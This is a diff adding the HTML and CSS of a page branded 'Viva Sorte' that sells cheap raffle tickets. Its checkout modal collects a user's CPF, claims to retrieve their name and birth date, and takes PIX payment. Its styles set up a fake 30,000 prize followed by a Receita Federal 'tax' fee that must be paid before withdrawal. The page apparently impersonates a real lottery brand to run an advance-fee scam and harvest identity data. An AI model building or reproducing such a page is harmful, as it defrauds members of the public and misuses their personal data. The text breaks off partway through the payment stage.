@@ -1,0 +1,2697 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Viva Sorte</title>
+    
+    <!-- UTMify -->
+    <script
+      src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+      data-utmify-prevent-xcod-sck
+      data-utmify-prevent-subids
+      async
+      defer
+    ></script>
+
+    <!-- CSS -->
+    <link href="css/style.css" rel="stylesheet">
+    <link href="css/rodape.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+    <link rel="stylesheet" href="css/bootstrap-icons.min.css">
+    
+    <!-- CSS DAS ETAPAS COMPLETAS -->
+    <style>
+    /* MODAL DE PAGAMENTO */
+    .modal-pagamento {
+        display: none;
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0,0,0,0.8);
+        z-index: 99999;
+        align-items: center;
+        justify-content: center;
+        padding: 15px;
+    }
+    
+    .modal-conteudo {
+        background: white;
+        border-radius: 15px;
+        width: 100%;
+        max-width: 420px;
+        max-height: 90vh;
+        overflow-y: auto;
+        position: relative;
+        box-shadow: 0 10px 40px rgba(0,0,0,0.3);
+    }
+    
+    .btn-fechar-modal {
+        position: absolute;
+        top: 10px;
+        right: 15px;
+        background: none;
+        border: none;
+        font-size: 28px;
+        color: #666;
+        cursor: pointer;
+        z-index: 10;
+        width: 40px;
+        height: 40px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 50%;
+    }
+    
+    .btn-fechar-modal:hover {
+        background: #f5f5f5;
+    }
+    
+    .modal-header {
+        text-align: center;
+        padding: 20px 20px 0;
+    }
+    
+    .logo-modal {
+        max-width: 140px;
+        height: auto;
+        margin: 0 auto 15px;
+    }
+    
+    /* PROGRESSO DAS ETAPAS */
+    .progresso-etapas {
+        display: flex;
+        justify-content: space-between;
+        padding: 0 15px;
+        margin: 0 0 20px;
+        position: relative;
+    }
+    
+    .etapa-item {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        flex: 1;
+        position: relative;
+        z-index: 2;
+    }
+    
+    .etapa-item:not(:last-child)::after {
+        content: '';
+        position: absolute;
+        top: 15px;
+        right: -50%;
+        width: 100%;
+        height: 2px;
+        background: #e0e0e0;
+        z-index: 1;
+    }
+    
+    .etapa-item.completada:not(:last-child)::after {
+        background: #2f4eb5;
+    }
+    
+    .etapa-item.ativa:not(:last-child)::after {
+        background: linear-gradient(to right, #2f4eb5, #e0e0e0);
+    }
+    
+    .etapa-numero {
+        width: 30px;
+        height: 30px;
+        border-radius: 50%;
+        background: #e0e0e0;
+        color: #999;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 14px;
+        font-weight: bold;
+        margin-bottom: 5px;
+        position: relative;
+        z-index: 2;
+    }
+    
+    .etapa-item.ativa .etapa-numero {
+        background: #2f4eb5;
+        color: white;
+    }
+    
+    .etapa-item.completada .etapa-numero {
+        background: #2f4eb5;
+        color: white;
+    }
+    
+    .etapa-nome {
+        font-size: 11px;
+        color: #999;
+        text-align: center;
+        font-weight: 600;
+    }
+    
+    .etapa-item.ativa .etapa-nome,
+    .etapa-item.completada .etapa-nome {
+        color: #2f4eb5;
+    }
+    
+    /* CORPO DO MODAL */
+    .modal-body {
+        padding: 0 20px 20px;
+    }
+    
+    .modal-body h2 {
+        color: #333;
+        font-size: 20px;
+        font-weight: 600;
+        margin-bottom: 5px;
+        text-align: center;
+    }
+    
+    .modal-body p {
+        color: #666;
+        font-size: 14px;
+        text-align: center;
+        margin-bottom: 15px;
+    }
+    
+    .resumo-compra {
+        background: #2f4eb5;
+        color: white;
+        border-radius: 8px;
+        padding: 10px;
+        margin-bottom: 15px;
+        text-align: center;
+        font-weight: 600;
+        font-size: 14px;
+    }
+    
+    /* FORMULÁRIOS */
+    .form-group {
+        margin-bottom: 15px;
+    }
+    
+    .form-group label {
+        display: block;
+        color: #333;
+        font-size: 14px;
+        font-weight: 600;
+        margin-bottom: 5px;
+    }
+    
+    .form-group input, .form-group select {
+        width: 100%;
+        padding: 12px 15px;
+        border: 2px solid #e0e0e0;
+        border-radius: 8px;
+        font-size: 16px;
+        transition: all 0.3s;
+    }
+    
+    .form-group input:focus, .form-group select:focus {
+        border-color: #2f4eb5;
+        outline: none;
+    }
+    
+    .exemplo-input {
+        color: #888;
+        font-size: 12px;
+        margin-top: 5px;
+    }
+    
+    /* BOTÕES */
+    .btn-principal {
+        width: 100%;
+        background: linear-gradient(to right, #2f4eb5, #3949ab);
+        color: white;
+        border: none;
+        padding: 15px;
+        border-radius: 8px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.3s;
+        margin-top: 10px;
+    }
+    
+    .btn-principal:hover {
+        background: linear-gradient(to right, #263a9c, #2f3d82);
+    }
+    
+    .btn-principal:disabled {
+        background: #cccccc;
+        cursor: not-allowed;
+    }
+    
+    /* MENSAGENS */
+    .mensagem-sucesso {
+        background: #d4edda;
+        border-left: 4px solid #28a745;
+        border-radius: 8px;
+        padding: 12px;
+        margin-bottom: 15px;
+        color: #155724;
+        font-size: 14px;
+    }
+    
+    .mensagem-sucesso i {
+        color: #28a745;
+        margin-right: 8px;
+    }
+    
+    .mensagem-erro {
+        color: #e74c3c;
+        font-size: 12px;
+        margin-top: 5px;
+        display: none;
+    }
+    
+    .recaptcha-nota {
+        color: #888;
+        font-size: 11px;
+        text-align: center;
+        margin-top: 15px;
+        line-height: 1.4;
+    }
+    
+    /* ETAPAS */
+    .etapa {
+        display: none;
+    }
+    
+    .etapa.ativa {
+        display: block;
+    }
+    
+    /* ETAPA 2 - PIX */
+    .resumo-pagamento {
+        background: #f8f9fa;
+        border-radius: 8px;
+        padding: 15px;
+        margin-bottom: 20px;
+    }
+    
+    .resumo-pagamento h3 {
+        color: #333;
+        font-size: 16px;
+        margin-bottom: 10px;
+        text-align: center;
+    }
+    
+    .detalhes-pagamento {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 8px;
+        color: #666;
+        font-size: 14px;
+    }
+    
+    .total-pagamento {
+        display: flex;
+        justify-content: space-between;
+        font-weight: bold;
+        font-size: 18px;
+        color: #2f4eb5;
+        padding-top: 10px;
+        border-top: 1px solid #ddd;
+    }
+    
+    .area-pix {
+        display: none;
+        margin-bottom: 20px;
+    }
+    
+    .qrcode-container {
+        background: white;
+        padding: 15px;
+        border-radius: 10px;
+        border: 1px solid #eee;
+        text-align: center;
+        margin-bottom: 15px;
+    }
+    
+    .codigo-pix {
+        background: #f8f9fa;
+        padding: 15px;
+        border-radius: 8px;
+    }
+    
+    .input-copiar {
+        display: flex;
+        margin-top: 10px;
+    }
+    
+    .input-copiar input {
+        flex: 1;
+        padding: 10px;
+        border: 1px solid #ddd;
+        border-radius: 6px 0 0 6px;
+        font-size: 12px;
+    }
+    
+    .input-copiar button {
+        background: #2f4eb5;
+        color: white;
+        border: none;
+        padding: 0 15px;
+        border-radius: 0 6px 6px 0;
+        cursor: pointer;
+        font-weight: 600;
+    }
+    
+    /* ETAPA 3 - CONFIRMAÇÃO */
+    .confirmacao-sucesso {
+        background: #d4edda;
+        border-radius: 10px;
+        padding: 20px;
+        text-align: center;
+        margin-bottom: 20px;
+        border-left: 5px solid #28a745;
+    }
+    
+    .icone-confirmacao {
+        font-size: 40px;
+        margin-bottom: 10px;
+    }
+    
+    /* NOVO ESTILO CLEAN PARA ANÚNCIO DE PRÊMIO */
+    .anuncio-premio-clean {
+        background: #f8f9fa;
+        border-radius: 12px;
+        padding: 25px 20px;
+        text-align: center;
+        margin: 20px 0;
+        border: 1px solid #eaeaea;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+    }
+
+    .icone-premio {
+        font-size: 48px;
+        color: #2f4eb5;
+        margin-bottom: 15px;
+        animation: pulse 2s infinite;
+    }
+
+    @keyframes pulse {
+        0% { transform: scale(1); }
+        50% { transform: scale(1.1); }
+        100% { transform: scale(1); }
+    }
+
+    .anuncio-premio-clean h3 {
+        color: #2f4eb5;
+        font-size: 22px;
+        font-weight: 700;
+        margin-bottom: 10px;
+    }
+
+    .texto-premio {
+        color: #333;
+        font-size: 16px;
+        line-height: 1.4;
+        margin-bottom: 8px;
+    }
+
+    .subtitulo-premio {
+        color: #666;
+        font-size: 14px;
+        opacity: 0.8;
+        margin-top: 10px;
+    }
+
+    /* BOTÃO PREMIO CLEAN */
+    .btn-premio-clean {
+        width: 100%;
+        background: linear-gradient(to right, #2f4eb5, #3949ab);
+        color: white;
+        border: none;
+        padding: 18px;
+        border-radius: 10px;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        margin-top: 10px;
+        box-shadow: 0 4px 15px rgba(47, 78, 181, 0.2);
+    }
+
+    .btn-premio-clean:hover {
+        background: linear-gradient(to right, #263a9c, #2f3d82);
+        transform: translateY(-2px);
+        box-shadow: 0 6px 20px rgba(47, 78, 181, 0.3);
+    }
+
+    .btn-premio-clean:active {
+        transform: translateY(0);
+    }
+
+    .btn-premio-clean i {
+        font-size: 18px;
+    }
+
+    .btn-premio-clean i.bi-arrow-right {
+        margin-left: 5px;
+    }
+    
+    /* ETAPA 4 - PRÊMIO DE 30 MIL E SOLICITAÇÃO CHAVE PIX */
+    .premio-ganho {
+        background: linear-gradient(135deg, #ffc107 0%, #ff9800 100%);
+        border-radius: 20px;
+        padding: 25px 20px;
+        text-align: center;
+        margin-bottom: 25px;
+        color: white;
+        position: relative;
+        overflow: hidden;
+        box-shadow: 0 10px 30px rgba(255, 152, 0, 0.3);
+    }
+    
+    .premio-ganho::before {
+        content: '';
+        position: absolute;
+        top: -50%;
+        left: -50%;
+        width: 200%;
+        height: 200%;
+        background: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
+        background-size: 20px 20px;
+        opacity: 0.3;
+        animation: float 20s linear infinite;
+    }
+    
+    @keyframes float {
+        0% { transform: translate(0, 0) rotate(0deg); }
+        100% { transform: translate(20px, 20px) rotate(360deg); }
+    }
+    
+    .texto-chamativo-premio {
+        color: #000;
+        font-size: 24px;
+        font-weight: 900;
+        margin-bottom: 15px;
+        text-align: center;
+        text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        animation: pulse-text 1.5s infinite;
+    }
+    
+    @keyframes pulse-text {
+        0%, 100% { transform: scale(1); }
+        50% { transform: scale(1.05); }
+    }
+    
+    .imagem-premio {
+        width: 100%;
+        max-width: 280px;
+        margin: 0 auto 20px;
+        border-radius: 15px;
+        overflow: hidden;
+        box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+        animation: bounce 2s infinite;
+        image-rendering: -webkit-optimize-contrast;
+        image-rendering: crisp-edges;
+        -ms-interpolation-mode: nearest-neighbor;
+        transform: translateZ(0);
+        backface-visibility: hidden;
+    }
+    
+    .imagem-premio img {
+        width: 100%;
+        height: auto;
+        display: block;
+        image-rendering: optimizeQuality;
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+        transform: translateZ(0);
+        backface-visibility: hidden;
+        max-width: 100%;
+        height: auto;
+    }
+    
+    @keyframes bounce {
+        0%, 100% { transform: translateY(0) scale(1); }
+        50% { transform: translateY(-10px) scale(1.02); }
+    }
+    
+    .premio-ganho h1 {
+        font-size: 32px;
+        margin-bottom: 15px;
+        font-weight: 900;
+        color: #000;
+        text-shadow: 0 2px 5px rgba(0,0,0,0.2);
+    }
+    
+    .valor-premio {
+        font-size: 48px;
+        font-weight: 900;
+        margin: 20px 0;
+        color: #000;
+        text-shadow: 0 3px 10px rgba(0,0,0,0.3);
+        animation: pulse-money 1.5s infinite;
+    }
+    
+    @keyframes pulse-money {
+        0%, 100% { transform: scale(1); }
+        50% { transform: scale(1.05); }
+    }
+    
+    .subtitulo-premio {
+        font-size: 20px;
+        font-weight: 600;
+        margin-bottom: 15px;
+        color: #000;
+    }
+    
+    /* FORMULÁRIO CHAVE PIX */
+    .form-chave-pix {
+        background: #f8f9fa;
+        border-radius: 15px;
+        padding: 20px;
+        margin-bottom: 20px;
+        border: 1px solid #eaeaea;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+    }
+    
+    .form-chave-pix h3 {
+        color: #2f4eb5;
+        margin-bottom: 15px;
+        font-size: 18px;
+        font-weight: 700;
+        text-align: center;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+    }
+    
+    .select-chave {
+        width: 100%;
+        padding: 12px;
+        border: 2px solid #e0e0e0;
+        border-radius: 8px;
+        margin-bottom: 15px;
+        font-size: 16px;
+    }
+    
+    /* INFORMAÇÃO DA COTA PREMIADA */
+    .info-cota-premiada {
+        background: #2f4eb5;
+        color: white;
+        padding: 12px 15px;
+        border-radius: 8px;
+        margin: 15px 0;
+        text-align: center;
+        font-weight: 600;
+        font-size: 16px;
+    }
+    
+    /* AVISO RECEITA FEDERAL - VERSÃO RESUMIDA */
+    .aviso-receita {
+        background: #fff3cd;
+        border-left: 4px solid #ffc107;
+        border-radius: 8px;
+        padding: 15px;
+        margin: 15px 0;
+        color: #856404;
+        font-size: 14px;
+        line-height: 1.5;
+    }
+    
+    .aviso-receita strong {
+        color: #2f4eb5;
+        font-size: 16px;
+    }
+    
+    /* QUADRO DA TAXA - CORRIGIDO PARA MOBILE */
+    .quadro-taxa {
+        background: #2f4eb5;
+        color: white;
+        padding: 15px;
+        border-radius: 8px;
+        text-align: center;
+        margin-top: 15px;
+    }
+    
+    .texto-taxa-pequeno {
+        font-size: 14px;
+        opacity: 0.9;
+        margin-bottom: 5px;
+    }
+    
+    .valor-taxa-branco {
+        font-size: 32px;
+        font-weight: 900;
+        color: white !important;
+        line-height: 1.2;
+        text-shadow: 0 2px 4px rgba(0,0,0,0.2);
+    }
+    
+    .texto-taxa-rodape {
+        font-size: 12px;
+        opacity: 0.8;
+        margin-top: 5px;
+    }
+    
+    /* ÁREA PAGAMENTO TAXA */
+    .area-pagamento-taxa {
+        display: none;
+        margin-top: 20px;
+        padding: 15px;
+        background: #f8f9fa;
+        border-radius: 8px;
+    }
+    
+    .aguardando-taxa {
+        text-align: center;
+        padding: 15px;
+        background: #f8f9fa;
+        border-radius: 8px;
+        margin-top: 10px;
+    }
+    
+    .btn-sacar-premio {
+        width: 100%;
+        background: linear-gradient(to right, #28a745, #20c997);
+        color: white;
+        border: none;
+        padding: 18px;
+        border-radius: 10px;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        margin-top: 10px;
+        box-shadow: 0 4px 15px rgba(40, 167, 69, 0.2);
+    }
+    
+    .btn-sacar-premio:hover {
+        background: linear-gradient(to right, #218838, #1e7e34);
+        transform: translateY(-2px);
+        box-shadow: 0 6px 20px rgba(40, 167, 69, 0.3);
+    }
+    
+    /* PASSOS DO PRÊMIO */
+    .passos-premio {
+        background: #f8f9fa;
+        border-radius: 15px;
+        padding: 25px 20px;
+        margin-bottom: 20px;
+        border: 1px solid #eaeaea;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.05);
+    }
+    
+    .passos-premio h3 {
+        color: #2f4eb5;
+        margin-bottom: 20px;
+        font-size: 18px;
+        font-weight: 700;
+        text-align: center;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+    }
+    
+    .passos-premio ul {
+        list-style: none;
+        padding: 0;
+        margin: 0;
+    }
+    
+    .passos-premio li {
+        display: flex;
+        align-items: flex-start;
+        margin-bottom: 15px;
+        color: #333;
+        font-size: 14px;
+        line-height: 1.5;
+        padding: 10px;
+        border-radius: 8px;
+        transition: all 0.3s;
+        background: white;
+        border-left: 4px solid #2f4eb5;
+    }
+    
+    .passos-premio li:hover {
+        transform: translateX(5px);
+        box-shadow: 0 3px 10px rgba(0,0,0,0.1);
+    }
+    
+    .passos-premio li span {
+        color: #2f4eb5;
+        margin-right: 12px;
+        font-size: 20px;
+        min-width: 24px;
+    }
+    
+    .passos-premio li span.bi-whatsapp {
+        color: #25D366;
+    }
+    
+    .passos-premio li span.bi-telephone {
+        color: #2f4eb5;
+    }
+    
+    .agradecimento {
+        text-align: center;
+        color: #666;
+        font-size: 14px;
+        margin-bottom: 25px;
+        padding: 20px;
+        background: #f8f9fa;
+        border-radius: 12px;
+        border: 1px solid #eaeaea;
+    }
+    
+    .agradecimento p {
+        margin-bottom: 10px;
+    }
+    
+    .agradecimento strong {
+        color: #2f4eb5;
+    }
+    
+    /* BOTÃO SUPORTE FINAL */
+    .btn-suporte-final {
+        width: 100%;
+        background: linear-gradient(to right, #2f4eb5, #3949ab);
+        color: white;
+        border: none;
+        padding: 18px;
+        border-radius: 12px;
+        font-size: 16px;
+        font-weight: 700;
+        cursor: pointer;
+        transition: all 0.3s;
+        margin-top: 10px;
+        box-shadow: 0 4px 15px rgba(47, 78, 181, 0.2);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+    }
+
+    .btn-suporte-final:hover {
+        background: linear-gradient(to right, #263a9c, #2f3d82);
+        transform: translateY(-2px);
+        box-shadow: 0 6px 20px rgba(47, 78, 181, 0.3);
+    }
+
+    .btn-suporte-final:active {
+        transform: translateY(0);
+    }
+
+    .btn-suporte-final i {
+        font-size: 18px;
+    }
+    
+    /* STYLES EXTRAS */
+    .cota-selected {
+        background: linear-gradient(to right, #2f4eb5, #3949ab) !important;
+        color: white !important;
+        transform: scale(1.05);
+        box-shadow: 0 5px 15px rgba(47, 78, 181, 0.3);
+    }
+    
+    .cota-selected h1, .cota-selected h2 {
+        color: white !important;
+    }
+    
+    .cota-selected .cota-qtd {
+        background: white !important;
+        color: #2f4eb5 !important;
+    }
+    
+    .destaque {
+        color: #ffc107;
+        position: absolute;
+        top: 10px;
+        right: 10px;
+        font-size: 20px;
+    }
+    
+    .popup {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        background: #28a745;
+        color: white;
+        padding: 15px 20px;
+        border-radius: 10px;
+        box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        z-index: 10000;
+        display: none;
+        font-weight: 600;
+        animation: slideIn 0.3s ease;
+    }
+    
+    @keyframes slideIn {
+        from {
+            transform: translateX(100%);
+            opacity: 0;
+        }
+        to {
+            transform: translateX(0);
+            opacity: 1;
+        }
+    }
+    
+    /* LOADING SPINNER */
+    .spinner {
+        display: inline-block;
+        width: 20px;
+        height: 20px;
+        border: 3px solid rgba(255,255,255,.3);
+        border-radius: 50%;
+        border-top-color: #fff;
+        animation: spin 1s ease-in-out infinite;
+        margin-right: 8px;
+    }
+    
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+    
+    /* ÁREA DE AGUARDANDO CONFIRMAÇÃO */
+    .aguardando-confirmacao {
+        display: none;
+        text-align: center;
+        padding: 15px;
+        background: #f8f9fa;
+        border-radius: 8px;
+        margin-top: 10px;
+    }
+    
+    .aguardando-texto {
+        font-size: 16px;
+        color: #333;
+        margin-bottom: 10px;
+        font-weight: 600;
+    }
+    
+    .aguardando-detalhes {
+        font-size: 14px;
+        color: #666;
+        margin-bottom: 15px;
+    }
+    
+    .rodinha-grande {
+        display: inline-block;
+        width: 40px;
+        height: 40px;
+        border: 4px solid #f3f3f3;
+        border-top: 4px solid #2f4eb5;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+        margin-bottom: 10px;
+    }
+
+    /* RESPONSIVIDADE */
+    @media (max-width: 480px) {
+        .modal-conteudo {
+            max-width: 95%;
+        }
+        
+        .premio-ganho {
+            padding: 20px 15px;
+        }
+        
+        .texto-chamativo-premio {
+            font-size: 20px;
+        }
+        
+        .imagem-premio {
+            max-width: 250px;
+        }
+        
+        .valor-premio {
+            font-size: 36px;
+        }
+        
+        .premio-ganho h1 {
+            font-size: 24px;
+        }
+        
+        .subtitulo-premio {
+            font-size: 16px;
+        }
+        
+        .passos-premio {
+            padding: 20px 15px;
+        }
+        
+        .btn-suporte-final, .btn-sacar-premio {
+            padding: 16px;
+            font-size: 15px;
+        }
+        
+        .quadro-taxa {
+            padding: 12px 10px;
+        }
+        
+        .valor-taxa-branco {
+            font-size: 28px;
+        }
+    }
+    </style>
+<script async="" defer="" src="js/pixel.js"></script>  <meta property="og:title" content="Viva Sorte">
+  <meta name="twitter:title" content="Viva Sorte">
+  <meta name="description" content="Lovable Generated Project">
+  <meta property="og:description" content="Lovable Generated Project">
+  <meta name="twitter:description" content="Lovable Generated Project">
+  <meta property="og:image" content="https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/e8139d15-f450-4b17-8a09-7cabec6d7126/id-preview-1b7eb6dd--0f3bb2fa-0d1e-4ed2-9eae-1d3982d3e9dd.lovable.app-1774501473514.png">
+  <meta name="twitter:image" content="https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/e8139d15-f450-4b17-8a09-7cabec6d7126/id-preview-1b7eb6dd--0f3bb2fa-0d1e-4ed2-9eae-1d3982d3e9dd.lovable.app-1774501473514.png">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta property="og:type" content="website">
+</head>
+<body>
+    <!-- HEADER -->
+    <header class="white-header">
+        <div class="logo">
+            <img src="images/logoviva.png" alt="Logomarca" class="logoviva">
+        </div>
+        <button class="menu-button" id="menuButton">HOJE</button>
+    </header>
+
+    <!-- BANNER -->
+    <div class="banner">
+        <div class="container-banner">
+            <div id="carouselExampleSlidesOnly" class="carousel slide" data-bs-ride="carousel">
+                <div class="carousel-inner">
+                    <div class="carousel-item active">
+                        <div class="tag-compre-agora"><span>Site Oficial</span></div>
+                        <img src="images/1m1.jpg" class="d-block w-100" alt="...">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- TÍTULO -->
+    <div class="sorteio-date w-100 text-center">
+        <h1>Sorteio <span style="background-color: #f0ad4e;" id="contador">HOJE</span> por apenas <span style="background-color: #2f4eb5;">R$0,99</span></h1>
+    </div>
+
+    <!-- PACOTES DE COTAS - CORRIGIDO COM event -->
+    <div class="container-principal">
+        <div class="cotas">
+            <div class="cotas-one">
+                <button type="button" class="cota" onclick="selecionarPacote(6, 5.94, event)">
+                    <div class="cota-qtd">+6</div>
+                    <h1>R$5,94</h1>
+                    <h2>SELECIONAR</h2>
+                </button>
+                <button type="button" class="cota" onclick="selecionarPacote(10, 9.90, event)">
+                    <div class="cota-qtd">+10</div>
+                    <h1>R$9,90</h1>
+                    <h2>SELECIONAR</h2>
+                </button>
+                <button type="button" class="cota" onclick="selecionarPacote(15, 14.85, event)">
+                    <div class="cota-qtd">+15</div>
+                    <h1>R$14,85</h1>
+                    <h2>SELECIONAR</h2>
+                </button>
+            </div>
+            
+            <div class="cotas-one">
+                <button type="button" class="cota" onclick="selecionarPacote(20, 19.85, event)">
+                    <div class="cota-qtd">+20</div>
+                    <h1>R$19,85</h1>
+                    <h2>SELECIONAR</h2>
+                </button>
+                <button type="button" class="cota" onclick="selecionarPacote(30, 29.70, event)">
+                    <div class="cota-qtd">+30</div>
+                    <h1>R$29,70</h1>
+                    <h2>SELECIONAR</h2>
+                </button>
+                <button type="button" class="cota" onclick="selecionarPacote(40, 39.60, event)">
+                    <div class="cota-qtd">+40</div>
+                    <h1>R$39,60</h1>
+                    <h2>SELECIONAR</h2>
+                </button>
+            </div>
+            
+            <div class="cotas-one">
+                <button type="button" class="cota" onclick="selecionarPacote(70, 69.30, event)">
+                    <i class="bi bi-star-fill destaque"></i>
+                    <div class="cota-qtd">+70</div>
+                    <h1>R$69,30</h1>
+                    <h2>SELECIONAR</h2>
+                </button>
+                <button type="button" class="cota" onclick="selecionarPacote(100, 99.00, event)">
+                    <div class="cota-qtd">+100</div>
+                    <h1>R$99,00</h1>
+                    <h2>SELECIONAR</h2>
+                </button>
+                <button type="button" class="cota" onclick="selecionarPacote(200, 199.00, event)">
+                    <div class="cota-qtd">+200</div>
+                    <h1>R$199,00</h1>
+                    <h2>SELECIONAR</h2>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- CONTADOR PERSONALIZADO -->
+    <div class="container-principal">
+        <div class="contador-cotas">
+            <span><button type="button" class="btn-contador-cotas" onclick="decrementar()">-</button></span>
+            <input type="number" id="numero" class="input-contador-cotas" value="0" min="0">
+            <span><button type="button" class="btn-contador-cotas" onclick="incrementar()">+</button></span>
+        </div>
+        
+        <button type="button" id="btn-adicionar-carrinho" class="adc-carrinho" onclick="comprarTitulosCustom()" disabled="">
+            <i class="bi bi-cart-fill"></i> COMPRAR TÍTULOS
+        </button>
+    </div>
+
+    <!-- MENSAGEM -->
+    <div class="container-principal">
+        <div class="sorteio-date w-100 text-center" style="margin-top: 5px;">
+            <br>
+            <h1 style="font-size: 0.72rem;">Comprar mais títulos aumenta suas chances de ganhar!</h1>
+        </div>
+    </div>
+
+    <!-- HOSPITAL -->
+    <div class="container-principal">
+        <div class="hospital">
+            <div class="card-hospital">
+                <div class="card-hospital-image">
+                    <img src="images/logo-hospital.svg">
+                    <h2>Instituição beneficiada</h2>
+                </div>
+                <div class="card-hospital-text">
+                    <p>O Hospital do Câncer de Londrina...</p>
+                </div>
+            </div>
+            
+            <div class="card-hospital card-hospital-bg-azul">
+                <div class="card-hospital-image">
+                    <img src="images/viva-hosp.svg">
+                    <h2>Viva Privilégios</h2>
+                </div>
+                <div class="card-hospital-text">
+                    <p>Viva Privilégios, um programa que enriquece sua vida...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- RODAPÉ -->
+    <div class="rodape">
+        <div class="container-principal">
+            <img class="logo-rodape" src="images/logoviva.png">
+            <div class="redes">
+                <i class="bi bi-instagram"></i>
+                <i class="bi bi-facebook"></i>
+                <i class="bi bi-twitter"></i>
+                <i class="bi bi-youtube"></i>
+            </div>
+            <h1>Sorteios lastreados por Títulos de Capitalização...</h1>
+            <div class="linha-rodape"></div>
+            <div class="patterns-rodape">
+                <div class="pattern-rodape">Títulos emitidos por: <img src="images/viacap.png"></div>
+                <div class="pattern-rodape">Promoção realizada por: <img src="images/viva.png"></div>
+                <div class="pattern-rodape">Desenvolvimento: <img src="images/edjdigital.png"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL DE PAGAMENTO COM 4 ETAPAS -->
+    <div id="modalPagamento" class="modal-pagamento">
+        <div class="modal-conteudo">
+            <button class="btn-fechar-modal" onclick="fecharModal()">×</button>
+            
+            <!-- ETAPA 1: IDENTIFICAÇÃO (CPF) -->
+            <div id="etapa1" class="etapa ativa">
+                <div class="modal-header">
+                    <img src="images/logoviva.png" alt="Viva Sorte" class="logo-modal">
+                </div>
+                
+                <div class="progresso-etapas">
+                    <div class="etapa-item ativa">
+                        <div class="etapa-numero">1</div>
+                        <div class="etapa-nome">Identificação</div>
+                    </div>
+                    <div class="etapa-item">
+                        <div class="etapa-numero">2</div>
+                        <div class="etapa-nome">Pagamento</div>
+                    </div>
+                    <div class="etapa-item">
+                        <div class="etapa-numero">3</div>
+                        <div class="etapa-nome">Confirmação</div>
+                    </div>
+                    <div class="etapa-item">
+                        <div class="etapa-numero">4</div>
+                        <div class="etapa-nome">Concluído</div>
+                    </div>
+                </div>
+                
+                <div class="modal-body">
+                    <h2>Olá, boas vindas!</h2>
+                    <p>Identifique-se usando seu CPF</p>
+                    <div class="resumo-compra" id="resumoCompra">6 títulos - R$5,94</div>
+                    
+                    <div class="form-group">
+                        <label>CPF</label>
+                        <input type="text" id="inputCPF" placeholder="Digite o seu CPF" maxlength="14">
+                        <div class="exemplo-input">Exemplo: 123.456.789-09</div>
+                        <div id="erroCPF" class="mensagem-erro"></div>
+                    </div>
+                    
+                    <!-- ÁREA DE CARREGAMENTO DA CONSULTA -->
+                    <div id="areaConsultaCPF" style="display: none; text-align: center; margin: 15px 0;">
+                        <div class="spinner" style="border-top-color: #2f4eb5;"></div>
+                        <p style="color: #666; font-size: 13px; margin-top: 10px;">Consultando dados do CPF...</p>
+                    </div>
+                    
+                    <!-- DADOS DO USUÁRIO ENCONTRADOS -->
+                    <div id="dadosEncontrados" class="mensagem-sucesso" style="display: none;">
+                        <i class="bi bi-check-circle-fill"></i>
+                        Dados encontrados com sucesso!
+                        <div style="font-size: 13px; margin-top: 8px; text-align: left; background: white; padding: 8px; border-radius: 5px; color: #333;">
+                            <div><strong>Nome:</strong> <span id="nomeEncontrado"></span></div>
+                            <div><strong>Data Nasc.:</strong> <span id="dataNascimentoEncontrada"></span></div>
+                        </div>
+                    </div>
+                    
+                    <div id="erroAPI" class="mensagem-erro" style="display: none;"></div>
+                    
+                    <button id="btnContinuarCPF" class="btn-principal" onclick="validarCPFeAvancar()" disabled="">
+                        Continuar
+                    </button>
+                    
+                    <div class="recaptcha-nota">
+                        Este site é protegido pelo Google reCAPTCHA. A Política de Privacidade e os Termos de Serviço da Google se aplicam.
+                    </div>
+                </div>
+            </div>
+            
+            <!-- ETAPA 2: PAGAMENTO (TELEFONE + PIX) -->
+            <div id="etapa2" class="etapa">
+                <div class="modal-header">
+                    <img src="images/logoviva.png" alt="Viva Sorte" class="logo-modal">
+                </div>
+                
+                <div class="progresso-etapas">
+                    <div class="etapa-item completada">
+                        <div class="etapa-numero">✓</div>
+                        <div class="etapa-nome">Identificação</div>
+                    </div>
+                    <div class="etapa-item ativa">
+                        <div class="etapa-numero">2</div>
+                        <div class="etapa-nome">Pagamento</div>
